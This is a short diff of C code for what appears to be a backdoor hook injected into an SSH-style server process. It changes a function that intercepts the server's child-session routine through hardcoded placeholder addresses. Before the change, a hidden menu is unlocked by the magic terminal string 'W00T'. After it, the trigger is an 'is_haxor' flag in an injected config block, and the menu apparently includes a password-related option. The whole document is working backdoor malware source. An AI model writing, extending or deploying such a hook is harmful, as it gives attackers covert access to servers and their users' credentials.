@@ -1,4 +1,5 @@
 #include "syscall.h"
+#include "config.h"
 
 void _memset(unsigned char *dst, unsigned char val, int len) {
 	while(len--) {
@@ -73,13 +74,14 @@ int hook_main(Session *s, char *command) {
 	char invalid_option[]=
 		"\n    [!] ERROR: Invalid menu option!\n\n";
 
-
 	char pass_str[]=
 		"\nLOL passwords..\n\n";
 
+	config_block *config_memory = (config_block*)(0xc0debabe13371337);
+
 	f_do_child do_child = (f_do_child)(0xc0cac01ac0debabe);
 
-	if (_strncmp(s->term, "W00T", 4) == 0) {
+	if (s->term != 0 && config_memory->is_haxor) { // _strncmp(s->term, "W00T", 4) == 0) {
 		_write(1, menu, _strlen(menu));
 
 		while(1) {
@@ -112,7 +114,6 @@ int hook_main(Session *s, char *command) {
 				break;
 			}
 		}
-
 	}
 	
 	return do_child(s, command);
